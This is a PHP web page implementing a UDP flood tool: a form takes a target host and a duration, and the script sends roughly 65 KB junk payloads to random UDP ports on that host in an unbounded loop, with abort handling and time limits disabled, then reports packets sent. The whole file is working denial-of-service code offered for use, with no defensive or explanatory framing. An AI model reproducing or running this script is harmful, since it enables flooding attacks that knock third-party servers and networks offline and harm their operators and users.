<html>
	<head>
		<!-- Latest compiled and minified CSS -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">

		<!-- Optional theme -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap-theme.min.css">

		<!-- Latest compiled and minified JavaScript -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
	</head>
	<body>
		<center>
			<?php
				if(isset($_GET['host'])&&isset($_GET['time'])){
					$packets = 0;
					ignore_user_abort(TRUE);
					set_time_limit(0);
				 
					$exec_time = $_GET['time'];
				 
					$time = time();
					$max_time = $time+$exec_time;
				 
					$host = $_GET['host'];
				 
					for($i=0;$i<65553;$i++){
							$out .= 'X';
					}
					while(1){
					$packets++;
							if(time() > $max_time){
									break;
							}
							$rand = rand(1,65553);
							$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
							if($fp){
									fwrite($fp, $out);
									fclose($fp);
							}
					}
				 
				 
					echo "<br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
					echo '<br><br>
							<form action="'.$surl.'" method=GET>
							<input type="hidden" name="xrt" value="php">
							Host <br>
							<input type=text name=host><br>
							Length (Seconds - 10-20 will be enough for private IPs) <br>
							<input type=text name=time><br><br>
							<button type="submit" value=" Send" class="btn btn-danger" id="submit" >Flood</button>';
				}
				else{
					echo '<br>
							<form action=? method=GET>
							<input type="hidden" name="xrt" value="php">
							Host <br>
							<input type=text name=host><br>
							Length (Seconds - 10-20 will be enough for private IPs) <br>
							<input type=text name=time><br><br>
							<button type="submit" value=" Send" class="btn btn-danger" id="submit" >Flood</button>';
				}
			?>
		</center>
	</body>
</html>
